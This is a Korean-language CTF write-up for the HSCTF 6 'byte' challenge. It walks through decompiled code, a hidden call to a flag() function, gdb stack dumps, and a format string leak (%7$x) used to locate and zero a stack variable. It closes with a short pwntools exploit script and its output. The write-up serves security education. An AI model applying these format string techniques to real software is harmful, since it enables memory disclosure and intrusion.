# [WriteUp]HSCTF 6 - byte

:black_nib:조성준(sjjo0225@gmail.com)

---

format string bug를 이용하면 간단하게 풀리는 문제이다.

---

## What does program do?

먼저 바이너리를 IDA로 디컴파일해보면 다음과 같다.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int *v3; // [esp+10h] [ebp-8Ch]
  int i; // [esp+14h] [ebp-88h]
  unsigned int v5; // [esp+18h] [ebp-84h]
  char s[100]; // [esp+1Ch] [ebp-80h]
  unsigned int v7; // [esp+80h] [ebp-1Ch]
  int *v8; // [esp+90h] [ebp-Ch]

  v8 = &argc;
  v7 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  signal(11, (__sighandler_t)((char *)&dword_0 + 1));
  puts("Welcome to the byte.\n\nI'll give you a couple tries on this one.\n");
  for ( i = 0; i <= 1; ++i )
  {
    printf("Give me the address of the byte: ");
    fgets(s, 10, stdin);
    v5 = strtoul(s, 0, 16);
    s[strcspn(s, "\n")] = 0;
    *__errno_location() = 0;
    if ( *__errno_location() == 34 )
    {
      printf("Lol, try again (hex uint32).");
      exit(1);
    }
    if ( s[0] == 102 )
    {
      v3 = (int *)&v3;
      strcat(s, " has been nullified!\n\n");
      printf(s);
      zero(v5);
    }
    else
    {
      strcat(s, " is not a valid pointer (must start with `f`. Try again.)\n\n");
      printf(s);
    }
  }
  puts("Well, at least you tried.");
  exit(0);
}
```

분석해 보면, 이 프로그램은 길이 10만큼의 문자열을 입력받고, `strtoul()`을 호출한다. 

`strtoul()`은 파이썬의 `int()`와 비슷한 역할을 하는데, 정수로 바꿀 수 없는 문자를 만나면 함수 실행이 중단되고 그 위치까지의 결과만 반환한다.

 `strcspn()`은 첫 번째 문자열의 앞에서부터 검사하여 두 번째 문자열에 포함된 문자를 만나면 그 위치까지 검사한 문자의 수를 반환한다. `s[strcspn(s, "\n")] = 0;`은 입력받은 문자열의 마지막에 있는 개행 문자를 `NULL`로 바꾸어 준다.

입력받은 문자열의 첫 문자가 `'f'`(아스키 코드 102)이면 문자열을 출력하고 `zero()`를 호출한다. 

---

`zero()`를 디컴파일하면 다음과 같다.

```c
_DWORD *__cdecl zero(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  return result;
}
```

문자열을 `strtoul()`로 변환한 정수를 주소로 인식하여 그 주소의 4바이트 공간에 0을 넣고 그 주소를 반환한다.

입력받은 문자열의 첫 문자가 `'f'`가 아니면 다시 시도하라는 메시지가 나온다. 지금까지의 과정을 두 번 반복하고 프로그램이 종료된다.

---

그런데 이 문제의 핵심은 이 바이너리가 디컴파일러를 속이고 있다는 것이다. gdb에서 어셈블리 코드를 보면 다음과 같은 부분이 있다.

```bash
0x56556571 <+590>:	cmp    WORD PTR [ebp-0x8e],0x0
0x56556579 <+598>:	jne    0x56556582 <main+607>
0x5655657b <+600>:	call   0x5655624d <flag>
```

IDA의 `main()`에서는 찾을 수 없는 코드이다. 뭔가 `flag`가 우리의 목적일 것 같은 느낌이 든다. IDA에서 `flag`를 찾아보자.

```c
void __noreturn flag()
{
  char i; // al
  FILE *stream; // [esp+Ch] [ebp-Ch]

  printf("that was easy, right? try the next level (bit). here's your flag: ");
  stream = fopen("flag", "r");
  for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
    putchar(i);
  fclose(stream);
  exit(0);
}
```

flag라는 파일을 열어서 내용을 출력한다. 물론 로컬에서 익스플로잇을 진행할 때는 flag라는 파일이 없으면 아무것도 나오지 않을 것이다.

---

## Exploit plan

`ebp-0x8e`가 가리키는 공간에 `0x0`이 들어 있어야 `flag()`가 실행된다. `zero()`에서 우리가 입력한 문자열에 해당하는 주소를 4바이트나 `0x0`으로 채워 주기 때문에, 스택의 주소만 leak하면 된다. 

스택 공간에 FSB로 추출할 적당한 주소값이 있는지 알아보기 위해 문자열을 입력한 후에 break point를 걸고 스택 프레임을 살펴보자.

```bash
gdb-peda$ x/52wx $esp
0xffffd0a0:	0xffffd0d8	0x565570e2	0x00000010	0x00000000
0xffffd0b0:	0x00000000	0xf7fd51a0	0xf7e76599	0xffffd204
0xffffd0c0:	0xf7ffc984	0xf7ffc988	0x0001d10a	0xf7e768f0
0xffffd0d0:	0x00000000	0x12345678	0x34333231	0x38373635
0xffffd0e0:	0xffff000a	0xffffd10b	0x00000001	0x000000c2
0xffffd0f0:	0x00000000	0x00c30000	0x00000001	0xf7ffc900
0xffffd100:	0xffffd150	0x00000000	0x00000000	0x7bbe4900
0xffffd110:	0x0000000b	0xffffd3b0	0xf7e0d4a9	0xf7fb8748
0xffffd120:	0xf7fb5000	0xf7fb5000	0x00000000	0xf7e0d60b
0xffffd130:	0xf7fb53fc	0x56558fa0	0xffffd20c	0x7bbe4900
0xffffd140:	0x00000001	0xffffd204	0xffffd20c	0xffffd170
0xffffd150:	0x00000000	0x00000000	0x00000000	0xf7df5e81
0xffffd160:	0xf7fb5000	0xf7fb5000	0x00000000	0xf7df5e81
```

`0xffffd0bc`에 위치한 `0xffffd204`라는 값이 굉장히 스택의 주소처럼 생겼다.

```bash
gdb-peda$ x/4wx 0xffffd204
0xffffd204:	0xffffd3b0	0x00000000	0xffffd3cc	0xffffd3e2
gdb-peda$ x/s 0xffffd3b0
0xffffd3b0:	"/home/cappit/HSCTF 6/byte"
```

`0xffffd204`라는 주소에는 프로그램이 실행될 때마다 변하지 않는 고유한 값이 저장되어 있음을 확인할 수 있다. 즉, `ebp`와의 오프셋도 일정할 것이다. 우리는 이 값, 즉 `esp+0x1c`에 저장된 값을 leak함으로써 우리가 `0x0`으로 덮어야 할 위치가 어딘지 알아낼 수 있다.

```bash
gdb-peda$ p/x $ebp - 0x8e
$1 = 0xffffd0ca
gdb-peda$ p/x 0xffffd204 - 0xffffd0ca
$2 = 0x13a
```

---

오프셋을 구했으니 이제 익스플로잇을 작성하면 될 것 같다.

```python
# exploit_byte.py

from pwn import *

p = process('./byte')

p.sendlineafter("byte: ", "%7$x")
stack = hex(int(p.recvuntil(" ")[:-1], 16) - 0x13a)[2:]
log.info("second input: " + stack)

p.sendlineafter("byte: ", stack)

p.interactive()
```

```bash
$ python exploit_byte.py
[+] Starting local process './byte': pid 14971
[*] second input: ff90bf7a
[*] Switching to interactive mode
ff90bf7a has been nullified!

that was easy, right? try the next level (bit). here's your flag: [*] Got EOF while reading in interactive
$
```

